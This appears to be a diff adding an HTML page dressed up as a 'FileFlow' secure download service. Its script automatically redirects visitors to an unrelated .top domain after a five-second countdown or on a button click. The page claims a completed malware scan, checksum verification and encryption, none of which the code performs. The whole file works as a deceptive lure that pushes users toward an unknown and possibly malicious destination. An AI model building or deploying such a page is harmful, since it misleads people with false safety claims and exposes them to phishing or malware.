@@ -1,0 +1,792 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>File Transfer in Progress</title>
+ 
+  <style>
+    :root {
+      --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+      --surface-light: #ffffff;
+      --surface-elevated: #f8f9fa;
+      --surface-overlay: rgba(255, 255, 255, 0.95);
+      --text-primary: #1a1a2e;
+      --text-secondary: #6b7280;
+      --text-muted: #9ca3af;
+      --accent-purple: #667eea;
+      --accent-pink: #f5576c;
+      --border-light: #e5e7eb;
+      --border-subtle: #f3f4f6;
+      --shadow-soft: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+      --shadow-medium: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+      --shadow-large: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+    }
+ 
+    * { 
+      box-sizing: border-box; 
+      margin: 0; 
+      padding: 0; 
+    }
+ 
+    html, body {
+      height: 100%;
+    }
+ 
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f5576c 100%);
+      background-size: 400% 400%;
+      animation: gradientShift 15s ease infinite;
+      color: var(--text-primary);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+      position: relative;
+      overflow-x: hidden;
+    }
+ 
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+ 
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        radial-gradient(circle at 20% 30%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 80% 70%, rgba(255, 255, 255, 0.08) 0%, transparent 50%);
+      pointer-events: none;
+    }
+ 
+    /* Floating particles */
+    .particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+ 
+    .particle {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      animation: float 20s infinite;
+    }
+ 
+    .particle:nth-child(1) { left: 10%; animation-delay: 0s; animation-duration: 15s; }
+    .particle:nth-child(2) { left: 20%; animation-delay: 2s; animation-duration: 18s; }
+    .particle:nth-child(3) { left: 30%; animation-delay: 4s; animation-duration: 16s; }
+    .particle:nth-child(4) { left: 40%; animation-delay: 1s; animation-duration: 20s; }
+    .particle:nth-child(5) { left: 50%; animation-delay: 3s; animation-duration: 17s; }
+    .particle:nth-child(6) { left: 60%; animation-delay: 5s; animation-duration: 19s; }
+    .particle:nth-child(7) { left: 70%; animation-delay: 2s; animation-duration: 21s; }
+    .particle:nth-child(8) { left: 80%; animation-delay: 4s; animation-duration: 14s; }
+ 
+    @keyframes float {
+      0% {
+        transform: translateY(100vh) scale(0);
+        opacity: 0;
+      }
+      10% {
+        opacity: 0.5;
+      }
+      90% {
+        opacity: 0.5;
+      }
+      100% {
+        transform: translateY(-100px) scale(1);
+        opacity: 0;
+      }
+    }
+ 
+    /* Main Container */
+    .wrapper {
+      position: relative;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      height: 100vh;
+      min-height: 600px;
+    }
+ 
+    /* Top Bar */
+    .topbar {
+      padding: 24px 32px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      backdrop-filter: blur(20px);
+      background: rgba(255, 255, 255, 0.1);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+    }
+ 
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: white;
+      font-weight: 700;
+      font-size: 18px;
+      letter-spacing: -0.5px;
+    }
+ 
+    .brand-icon {
+      width: 36px;
+      height: 36px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      backdrop-filter: blur(10px);
+    }
+ 
+    .topbar-links {
+      display: flex;
+      gap: 24px;
+    }
+ 
+    .topbar-link {
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      transition: all 0.3s;
+      padding: 8px 16px;
+      border-radius: 8px;
+    }
+ 
+    .topbar-link:hover {
+      background: rgba(255, 255, 255, 0.15);
+      color: white;
+    }
+ 
+    /* Center Content */
+    .center-stage {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+ 
+    .content-box {
+      width: 100%;
+      max-width: 560px;
+    }
+ 
+    .transfer-card {
+      background: var(--surface-overlay);
+      backdrop-filter: blur(40px);
+      border-radius: 24px;
+      overflow: hidden;
+      box-shadow: 
+        var(--shadow-large),
+        0 0 0 1px rgba(255, 255, 255, 0.1),
+        0 0 60px rgba(102, 126, 234, 0.3);
+      animation: cardEntrance 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+ 
+    @keyframes cardEntrance {
+      from {
+        opacity: 0;
+        transform: translateY(30px) scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+ 
+    .card-top {
+      padding: 32px 32px 28px;
+      text-align: center;
+      background: linear-gradient(180deg, rgba(102, 126, 234, 0.08) 0%, transparent 100%);
+      border-bottom: 2px solid var(--border-subtle);
+    }
+ 
+    .transfer-icon {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 20px;
+      background: var(--primary-gradient);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 16px rgba(102, 126, 234, 0.3);
+      position: relative;
+    }
+ 
+    .transfer-icon::after {
+      content: '';
+      position: absolute;
+      inset: -2px;
+      background: var(--primary-gradient);
+      border-radius: 20px;
+      z-index: -1;
+      opacity: 0.3;
+      filter: blur(8px);
+    }
+ 
+    .transfer-icon svg {
+      width: 36px;
+      height: 36px;
+      stroke: white;
+      stroke-width: 2;
+      fill: none;
+      animation: iconPulse 2s ease-in-out infinite;
+    }
+ 
+    @keyframes iconPulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+ 
+    .card-heading {
+      font-size: 26px;
+      font-weight: 800;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+      letter-spacing: -0.5px;
+    }
+ 
+    .card-subheading {
+      font-size: 15px;
+      color: var(--text-secondary);
+      font-weight: 500;
+    }
+ 
+    .verification-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 16px;
+      padding: 6px 14px;
+      background: rgba(16, 185, 129, 0.1);
+      border: 1.5px solid rgba(16, 185, 129, 0.3);
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #059669;
+    }
+ 
+    .check-mark {
+      width: 14px;
+      height: 14px;
+      background: #10b981;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 9px;
+    }
+ 
+    .card-body {
+      padding: 32px;
+    }
+ 
+    /* Timer Display */
+    .timer-section {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+ 
+    .timer-label {
+      font-size: 13px;
+      color: var(--text-muted);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 12px;
+    }
+ 
+    .timer-display {
+      font-size: 56px;
+      font-weight: 900;
+      background: var(--primary-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -2px;
+      line-height: 1;
+      font-variant-numeric: tabular-nums;
+    }
+ 
+    /* Progress Bar */
+    .progress-container {
+      margin-bottom: 28px;
+    }
+ 
+    .progress-track {
+      height: 12px;
+      background: var(--border-subtle);
+      border-radius: 20px;
+      overflow: hidden;
+      position: relative;
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+    }
+ 
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: var(--primary-gradient);
+      border-radius: 20px;
+      transition: width 0.1s linear;
+      position: relative;
+      box-shadow: 0 0 12px rgba(102, 126, 234, 0.5);
+    }
+ 
+    .progress-fill::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+      animation: progressShine 1.5s infinite;
+    }
+ 
+    @keyframes progressShine {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+ 
+    .progress-info {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+      font-size: 12px;
+    }
+ 
+    .progress-text {
+      color: var(--text-secondary);
+      font-weight: 500;
+    }
+ 
+    .progress-number {
+      color: var(--accent-purple);
+      font-weight: 700;
+    }
+ 
+    /* Action Button */
+    .action-btn {
+      width: 100%;
+      padding: 16px 24px;
+      background: var(--primary-gradient);
+      color: white;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 
+        0 4px 14px rgba(102, 126, 234, 0.4),
+        inset 0 1px 0 rgba(255, 255, 255, 0.2);
+      position: relative;
+      overflow: hidden;
+      letter-spacing: 0.3px;
+    }
+ 
+    .action-btn::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+ 
+    .action-btn:hover::before {
+      width: 300px;
+      height: 300px;
+    }
+ 
+    .action-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 
+        0 8px 20px rgba(102, 126, 234, 0.5),
+        inset 0 1px 0 rgba(255, 255, 255, 0.3);
+    }
+ 
+    .action-btn:active {
+      transform: translateY(0);
+    }
+ 
+    .btn-content {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+ 
+    .btn-icon {
+      width: 20px;
+      height: 20px;
+      stroke: white;
+      stroke-width: 2.5;
+      fill: none;
+    }
+ 
+    /* Status Info */
+    .status-panel {
+      margin-top: 24px;
+      padding: 16px 20px;
+      background: linear-gradient(135deg, rgba(102, 126, 234, 0.05) 0%, rgba(245, 87, 108, 0.05) 100%);
+      border: 1.5px solid rgba(102, 126, 234, 0.15);
+      border-radius: 12px;
+    }
+ 
+    .status-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+ 
+    .status-row:last-child {
+      margin-bottom: 0;
+    }
+ 
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      background: var(--accent-purple);
+      border-radius: 50%;
+      flex-shrink: 0;
+      animation: dotBlink 1.5s infinite;
+    }
+ 
+    @keyframes dotBlink {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.9); }
+    }
+ 
+    .status-text {
+      font-size: 13px;
+      color: var(--text-secondary);
+      font-weight: 500;
+    }
+ 
+    /* Bottom Notice */
+    .notice-box {
+      margin-top: 24px;
+      padding: 14px 18px;
+      background: rgba(59, 130, 246, 0.08);
+      border-left: 3px solid #3b82f6;
+      border-radius: 10px;
+    }
+ 
+    .notice-text {
+      font-size: 13px;
+      color: var(--text-secondary);
+      line-height: 1.6;
+    }
+ 
+    .notice-text strong {
+      color: var(--text-primary);
+      font-weight: 700;
+    }
+ 
+    /* Footer */
+    .footer-bar {
+      padding: 20px 32px;
+      backdrop-filter: blur(20px);
+      background: rgba(255, 255, 255, 0.1);
+      border-top: 1px solid rgba(255, 255, 255, 0.2);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+ 
+    .footer-copyright {
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.8);
+      font-weight: 500;
+    }
+ 
+    .footer-menu {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+ 
+    .footer-menu a {
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.7);
+      text-decoration: none;
+      font-weight: 500;
+      transition: color 0.2s;
+    }
+ 
+    .footer-menu a:hover {
+      color: white;
+    }
+ 
+    /* Responsive */
+    @media (max-width: 768px) {
+      .topbar {
+        padding: 16px 20px;
+      }
+ 
+      .topbar-links {
+        display: none;
+      }
+ 
+      .center-stage {
+        padding: 24px 16px;
+      }
+ 
+      .card-top {
+        padding: 24px 20px;
+      }
+ 
+      .card-body {
+        padding: 24px 20px;
+      }
+ 
+      .card-heading {
+        font-size: 22px;
+      }
+ 
+      .timer-display {
+        font-size: 48px;
+      }
+ 
+      .footer-bar {
+        padding: 16px 20px;
+        flex-direction: column;
+        text-align: center;
+      }
+ 
+      .transfer-icon {
+        width: 64px;
+        height: 64px;
+      }
+ 
+      .transfer-icon svg {
+        width: 32px;
+        height: 32px;
+      }
+    }
+ 
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+  </style>
+</head>
+ 
+<body>
+  <div class="particles">
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+  </div>
+ 
+  <div data-redirect-url="https://4xxlnf.top/velocity" data-delay-ms="5000" id="root" class="wrapper">
+    
+    <header class="topbar">
+      <div class="brand">
+        <div class="brand-icon">⚡</div>
+        <span>FileFlow</span>
+      </div>
+      <nav class="topbar-links">
+        <a href="#" class="topbar-link">Features</a>
+        <a href="#" class="topbar-link">Pricing</a>
+        <a href="#" class="topbar-link">Support</a>
+      </nav>
+    </header>
+ 
+    <main class="center-stage">
+      <div class="content-box">
+        <div class="transfer-card">
+          
+          <div class="card-top">
+            <div class="transfer-icon">
+              <svg viewBox="0 0 24 24">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                <polyline points="7 10 12 15 17 10"/>
+                <line x1="12" y1="15" x2="12" y2="3"/>
+              </svg>
+            </div>
+            <h1 class="card-heading">Transfer Ready</h1>
+            <p class="card-subheading">Your secure download is being prepared</p>
+            <div class="verification-tag">
+              <span class="check-mark">✓</span>
+              <span>Verified & Encrypted</span>
+            </div>
+          </div>
+ 
+          <div class="card-body">
+            
+            <div class="timer-section">
+              <div class="timer-label">Starting in</div>
+              <div class="timer-display" id="mainTimer">5s</div>
+            </div>
+ 
+            <div class="progress-container">
+              <div class="progress-track">
+                <div class="progress-fill" id="progressFill"></div>
+              </div>
+              <div class="progress-info">
+                <span class="progress-text">Automatic redirect</span>
+                <span class="progress-number" id="percentDisplay">0%</span>
+              </div>
+            </div>
+ 
+            <button class="action-btn" id="triggerBtn" type="button">
+              <span class="btn-content">
+                <svg class="btn-icon" viewBox="0 0 24 24">
+                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                  <polyline points="7 10 12 15 17 10"/>
+                  <line x1="12" y1="15" x2="12" y2="3"/>
+                </svg>
+                <span>Start Download</span>
+              </span>
+            </button>
+ 
+            <div class="status-panel">
+              <div class="status-row">
+                <div class="status-dot"></div>
+                <div class="status-text">Connection secured with SSL/TLS encryption</div>
+              </div>
+              <div class="status-row">
+                <div class="status-dot"></div>
+                <div class="status-text">File integrity verified via checksum</div>
+              </div>
+              <div class="status-row">
+                <div class="status-dot"></div>
+                <div class="status-text">Malware scan completed successfully</div>
+              </div>
+            </div>
+ 
+            <div class="notice-box">
+              <p class="notice-text">
+                <strong>Please wait.</strong> Your download will begin automatically. 
+                If it doesn't start, click the button above or refresh the page.
+              </p>
+            </div>
+ 
+          </div>
+        </div>
+      </div>
+    </main>
+ 
+    <footer class="footer-bar">
+      <div class="footer-copyright">© 2026 FileFlow Transfer Service</div>
+      <nav class="footer-menu">
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Help Center</a>
+        <a href="#">Contact</a>
+      </nav>
+    </footer>
+ 
+  </div>
+ 
+  <script>
+    (function () {
+      'use strict';
+      
+      const rootEl = document.getElementById('root');
+      const targetUrl = rootEl.dataset.redirectUrl || '';
+      const totalDelay = Math.max(0, Number(rootEl.dataset.delayMs || 5000));
+ 
+      const timerEl = document.getElementById('mainTimer');
+      const fillEl = document.getElementById('progressFill');
+      const percentEl = document.getElementById('percentDisplay');
+      const btnEl = document.getElementById('triggerBtn');
+ 
+      let beginTime = performance.now();
+      let hasRedirected = false;
+      let animFrame = null;
+ 
+      function limit(val, min, max) {
+        return Math.min(max, Math.max(min, val));
+      }
+ 
+      function update(timestamp) {
+        if (hasRedirected) return;
+        
+        const passed = timestamp - beginTime;
+        const fraction = totalDelay === 0 ? 1 : limit(passed / totalDelay, 0, 1);
+        const remaining = Math.ceil(Math.max(0, totalDelay - passed) / 1000);
+        const percent = Math.round(fraction * 100);
+ 
+        if (timerEl) timerEl.textContent = remaining + 's';
+        if (fillEl) fillEl.style.width = percent + '%';
+        if (percentEl) percentEl.textContent = percent + '%';
+ 
+        if (passed >= totalDelay) {
+          performRedirect();
+          return;
+        }
+        
+        animFrame = requestAnimationFrame(update);
+      }
+ 
+      function performRedirect() {
+        if (hasRedirected) return;
+        hasRedirected = true;
+        
+        if (animFrame) cancelAnimationFrame(animFrame);
+        
+        if (targetUrl) {
+          window.location.assign(targetUrl);
+        }
+      }
+ 
+      if (btnEl) {
+        btnEl.addEventListener('click', performRedirect);
+      }
+ 
+      animFrame = requestAnimationFrame(update);
+ 
+      document.addEventListener('visibilitychange', function () {
+        if (document.hidden) {
+          if (animFrame) cancelAnimationFrame(animFrame);
+        } else if (!hasRedirected) {
+          const elapsed = performance.now() - beginTime;
+          if (elapsed < totalDelay) {
+            animFrame = requestAnimationFrame(update);
+          }
+        }
+      });
+    })();
+  </script>
+ 
+</body>
+</html>
